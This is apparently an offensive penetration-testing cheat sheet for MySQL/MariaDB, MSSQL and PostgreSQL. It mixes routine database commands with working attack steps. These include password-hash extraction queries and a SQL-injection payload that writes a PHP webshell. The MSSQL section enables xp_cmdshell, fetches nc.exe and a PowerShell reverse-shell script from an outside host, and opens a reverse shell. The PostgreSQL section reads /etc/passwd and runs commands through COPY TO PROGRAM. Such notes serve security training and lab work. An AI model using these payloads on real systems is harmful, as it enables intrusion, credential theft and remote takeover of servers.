## MySQL & MariaDB
###### Connect
`mysql -u root -p'root' -h 192.168.50.16 -P 3306`
###### Connect Without SSL (Troubleshoot)
`mysql -u root -p'root' -h 192.168.50.16 -P 3306 --skip-ssl`
###### Version
`select version();`
###### Current DB User
`select system_user();`
###### Show Databases
`show databases;`
###### Select Database
`use shellcorp;`
###### Show Tables
`show tables;`
###### Show Tables Without Selecting Database
`show tables from shellcorp`
###### Query Table in Specific Database
`select * from database_name.table_name;`
###### Example Password Extraction from MySQL 5.7+ Database
`SELECT user, authentication_string FROM mysql.user WHERE user = 'pete';`
```
+--------+------------------------------------------------------------------------+
| user   | authentication_string                                                  |
+--------+------------------------------------------------------------------------+
| pete   | $A$005$?qvorPp8#lTKH1j54xuw4C5VsXe5IAa1cFUYdQMiBxQVEzZG9XWd/e6|
+--------+------------------------------------------------------------------------+
1 row in set (0.106 sec)
```
**Note:** MySQL 8+ does not often have the `mysql_native_password` plugin and so this technique may not work. Password hashes are not easily retrievable in MySQL 8+. If it is in use, try the following:
`SELECT user, plugin, host, authentication_string FROM mysql.user;`
###### Example User Enumeration from MySQL 8+ Database
`SELECT user, plugin, host FROM mysql.user;`

Command shows us selecting both the `user` and the `authentication_string` from the `user` table in the `mysql` database (`mysql.user`) where we have specified the `user`.
###### Gain a Shell
Inject a webshell into a file you can navigate to:
`' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`

---
## MSSQL
For Windows, there is a built in command named `SQLCMD` that can be used to run Windows through the command prompt or remotely from another machine. Kali uses `impacket-mssqlclient`. When using an SQL Server command line tool like sqlcmd, we must submit our SQL statement ending with a semicolon followed by _GO_ on a separate line. However, when running the command remotely, we can omit the GO statement since it's not part of the MSSQL TDS protocol.

###### Connect
`impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`
The `-windows-auth` flag forces NTLM authentication instead of Kerberos.
###### Version
`SELECT @@version;`
###### Current DB User
`SELECT CURRENT_USER;` or `SELECT SYSTEM_USER;`
###### Show Databases
`SELECT name FROM sys.databases;`
Default databases are `master`, `tempdb`, `model`, and `msdb`.
###### Select Database
`USE shellcorp;`
###### Show Tables
`SELECT TABLE_NAME FROM shellcorp.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'`
###### Show Tables Without Selecting Database
`SELECT * FROM shellcorp.information_schema.tables;`
###### Query Table in Specific Database
`SELECT * FROM shellcorp.dbo.users;`
The DBO table schema needs to go between the database and the table names.
###### Find Password Columns in Databases
`use <DatabaseName>; SELECT TABLE_CATALOG AS DatabaseName, TABLE_SCHEMA AS SchemaName, TABLE_NAME AS TableName, COLUMN_NAME AS ColumnName FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME like '%pass%';`
Identify the table names for the next command.
`user <DatabaseName>; SELECT top 1000 * FROM <TableName>`
###### Example Password Extraction from MSSQL Database
`SELECT name, password_hash FROM sys.sql_logins WHERE name = 'pete';`
```
+--------+------------------------------------------+
| name   | password_hash                            |
+--------+------------------------------------------+
| pete   | 0x0200...some_hash_value...              |
+--------+------------------------------------------+
```
The `sys.sql_logins` view contains information about SQL Server logins, including their hashed passwords.
###### View Database Users
`SELECT * FROM sys.database_principals`
This is on MSSQL versions after 2005.
###### Gain a Shell with xp_cmdshell
```ms-sql
impacket-mssqlclient Administrator:Password123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -command "(New-Object System.Net.WebClient).DownloadFile(''http://10.10.14.158/nc.exe'', ''C:\Reports\nc.exe'')"';
EXEC xp_cmdshell 'C:\Reports\nc.exe 10.10.14.158 4444 -e cmd.exe'
```
OR
`EXEC xp_cmdshell 'powershell -e "<base64-powershell-reverseshell>"'`
###### Gain a Shell with xp_cmdshell restricted
```ms-sql
DECLARE @ole INT;
EXEC sp_oacreate 'WScript.Shell', @ole OUT;
EXEC sp_oamethod @ole, 'Run', NULL, 'cmd /c powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.158/revshell.ps1'')"';
```
---
## PostgreSQL
**Note:** Press `q` to exit long pages.
###### Connect
`psql -U postgres -h 192.168.50.16 -p 5432 -d database_name`
###### Connect Without SSL (Troubleshoot)
`psql "sslmode=disable host=192.168.50.16 port=5432 user=postgres dbname=database_name"`
###### Version
`SELECT version();`
###### Current DB User
`SELECT current_user;`
###### View User Roles
`\du`
###### Show Databases
`\l`
###### Select Database
`\c database_name`
###### Show Tables
`\dt`
###### Show Tables Without Selecting Database
`psql -U postgres -d database_name -c "\dt"`
###### Query Table In Specific Database
`SELECT * FROM schema_name.table_name;`
###### Show Contents of Table
`SELECT * FROM table_name;`
###### List Of Schemas
`\dn`
###### Show Table Details
`\d table_name`
###### List All Columns Of A Table
`SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table_name';`
###### Example Password Extraction From PostgreSQL Database
`SELECT rolname, rolpassword FROM pg_authid WHERE rolname = 'pete';`
```
+---------+------------------------------------------+
| rolname | rolpassword                              |
+---------+------------------------------------------+
| pete    | md5a7b8f65e3c3c4e987cc7b8db11e6d8f4      |
+---------+------------------------------------------+
```
**Note:** Accessing the `pg_authid` view requires superuser privileges. 
###### Example File Read
`SELECT pg_read_file('/etc/passwd', 0, 1000);`
###### Enable/Use Extensions (e.g., pgcrypto)
`CREATE EXTENSION IF NOT EXISTS pgcrypto;`
###### Example Injection For Webshell
Inject webshell into file you can navigate to:
`COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/tmp/webshell.php';`
###### Gain A Shell
```
CREATE OR REPLACE FUNCTION exec_shell(command text) RETURNS void AS $$
BEGIN
   EXECUTE 'COPY (SELECT ' || quote_literal(command) || ') TO PROGRAM ''/bin/sh''';
END;
$$ LANGUAGE plpgsql;

SELECT exec_shell('whoami');
```
